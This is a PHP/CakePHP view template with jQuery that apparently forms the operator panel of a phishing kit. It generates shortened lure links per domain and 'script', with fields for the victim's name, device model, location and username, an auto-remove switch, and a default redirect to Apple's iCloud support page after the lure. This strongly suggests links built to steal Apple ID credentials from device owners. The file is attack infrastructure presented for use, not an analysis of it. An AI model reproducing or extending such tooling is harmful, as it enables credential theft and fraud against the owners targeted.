<?php

	echo $this->ModernizeComponent->create_card_container_start('Generate Link');
	echo $this->Form->create('GeneratedLink',array('url'=>array('controller' => 'scripts', 'action' => 'start_generate', 'prefix' => false)));
	echo '<div class="row">';
	
	echo '<div class="col-md-6">';
	echo '<img id="sample_design" src="../img/script/.png" style="width: 100%;background-color: gray;border: 1px solid gray;">';
	echo '</div>';
	
	echo '<div class="col-md-6">';
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'vertical',
			'contents' => array(
				array('domain_id',12, array('label' => 'Domain','type'=>'select','required'),$domain_list),
				array('script_id',12, array('label' => 'Script','type'=>'select','required'),$script_list),
				'<div class="row map_field p-0 m-0" style="display: none">',
				array('device_class',12, array('label' => 'Model','type'=>'select'),$device_list),
				array('victim_name',6, array('label' => 'Owner Name','placeholder'=>'Optional')),
				array('manual_location',6, array('placeholder'=>'Optional (e.g New York, USA )')),
				'</div>',
				array('username',6, array('label' => 'Email or Username','placeholder'=>'Optional')),
				array('notes',6, array('placeholder'=>'Optional')),
				array('redirect_url',12, array('label'=>'Redirect URL <small class="text-danger">(Required http:// or https://)</small>','required','placeholder'=>'https://support.apple.com/icloud')),
				array('autoremove',12, array('label'=>'Enable Autoremove','type'=>'switch_yes','checked')),
			)
		)
	));
	
	echo $this->ModernizeComponent->create_form_action_start();
	echo $this->Form->button('<i class="fa-regular fa-code me-2 fs-4"></i> Generate Link',array('type'=>'submit','class'=>'btn btn-success font-medium rounded-pill px-5'));
	echo $this->ModernizeComponent->create_form_action_end();
	
	echo '</div>';
	
	
	
	
	
	echo '</div>';
	echo $this->Form->end();
	echo $this->ModernizeComponent->create_card_container_end();
	
	
	$short_link_group = array(
		array('result_short_link', array('div'=>false,'type'=>'text','class'=>'form-control','readonly')),
		array('copy',array('type'=>'button','value'=>'Copy','id'=>'copy_short_link','class'=>'btn btn-outline-secondary')),
		array('browse',array('type'=>'button','id'=>'browse_short_link','value'=>'Browse','class'=>'btn btn-outline-secondary')),
	);
	
	$link_group = array(
		array('result_link', array('div'=>false,'type'=>'text','class'=>'form-control','readonly')),
		array('copy',array('type'=>'button','value'=>'Copy','id'=>'copy_link','class'=>'btn btn-outline-secondary')),
		array('browse',array('type'=>'button','id'=>'browse_link','value'=>'Browse','class'=>'btn btn-outline-secondary')),
	);
	
	//result modal
	echo $this->ModernizeComponent->create_start_modal('result_modal','Generated Link');
	echo  $this->ModernizeComponent->create_form_basic_input_batch(array(
		array(
			'size' => 12,
			'orientation' => 'vertical',
			'contents' => array(
				array('short_link',12, array('type'=>'input_group'),$short_link_group),
				array('link',12, array('type'=>'input_group'),$link_group),
			)
		)
	));
	echo $this->ModernizeComponent->create_end_modal();
	

?>

<script>
var supported_web = JSON.parse('<?=$supported_web?>');
$( document ).ready(function() {
	// alert(123);
	$('#GeneratedLinkScriptId').on('change',function(){
		var base_url = "<?=Configure::read('BASE_URL')?>";
		var map = $(this).find(":selected").attr('map');
		var web = $(this).find(":selected").attr('web');
		var img = base_url + $(this).find(":selected").attr('img');
		
		$('#sample_design').attr('src',img);
		
		var redirect_url = supported_web[web]['redirect_url'];
		$('#GeneratedLinkRedirectUrl').val(redirect_url);
		
		if(map==='1'){
			if(web=='Apple'){
				$('#GeneratedLinkDeviceClass').attr('required',true);
			}else{
				$('#GeneratedLinkDeviceClass').removeAttr('required');
			}
			$('.map_field').show();
		}else{
			$('#GeneratedLinkDeviceClass').attr('required',false);
			$('.map_field').hide();
		}
		
	});
	
	$('#GeneratedLinkStartGenerateForm').on('submit',function(e){
		e.preventDefault();
		showLoading();
		$('button[type="submit"]').prop('disabled', true);
		$.ajax({
		  type: "POST",
		  url: "<?php echo Configure::read('BASE_URL') ?>scripts/start_generate",
		  data:  $(this).serialize(),
		  dataType: "json",
		  success: function(data){
			  if(data.success == true){
				  
				  $('#result_short_link').val(data.shorten_link);
				  $('#result_link').val(data.link);
				  hideLoading();
				  $('#result_modal').modal('show');
				  
			  }else if (data.success == false){
				  swal.fire("Error", data.msg, "error");
			  }else{
				  swal.fire("Error", 'Link not available please create different link', "error");
			  }
			  $('button[type="submit"]').prop('disabled', false);
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			  swal.fire("Error", 'Link not available please create different link', "error");
			  $('button[type="submit"]').prop('disabled', false);
		  }
		});	
	});
	
	
	var copyShortLinkButton = document.getElementById('copy_short_link');
	var copyShortLink = document.getElementById('result_short_link');
	var short_link_tooltip = new bootstrap.Tooltip(copyShortLinkButton);
	copyShortLinkButton.setAttribute('data-bs-original-title', 'Copy to Clipboard');
	$('#copy_short_link').on('click', function() {
	  
	  copyShortLinkButton.removeAttribute('data-bs-original-title');
	  copyShortLink.select();
      document.execCommand('copy');

      // Set new title and show tooltip
      copyShortLinkButton.setAttribute('data-bs-original-title', 'Copied!');
      short_link_tooltip.show();
	  copyShortLinkButton.setAttribute('data-bs-original-title', 'Copy to Clipboard');
	  
	});
	
	
	var copyLinkButton = document.getElementById('copy_link');
    var copyLink = document.getElementById('result_link');
    var link_tooltip = new bootstrap.Tooltip(copyLinkButton);
	copyLinkButton.setAttribute('data-bs-original-title', 'Copy to Clipboard');

	$('#copy_link').on('click', function() {
	  
	  copyLinkButton.removeAttribute('data-bs-original-title');
	  copyLink.select();
      document.execCommand('copy');

      // Set new title and show tooltip
      copyLinkButton.setAttribute('data-bs-original-title', 'Copied!');
      link_tooltip.show();
	  copyLinkButton.setAttribute('data-bs-original-title', 'Copy to Clipboard');
	  
	});
	
	
	$('#browse_short_link').on('click',function(e){
		var url = $('#result_short_link').val(); 
		window.open(url, '_blank');
	});
	
	$('#browse_link').on('click',function(e){
		var url = $('#result_link').val(); 
		window.open(url, '_blank');
	});
	
	
});
</script>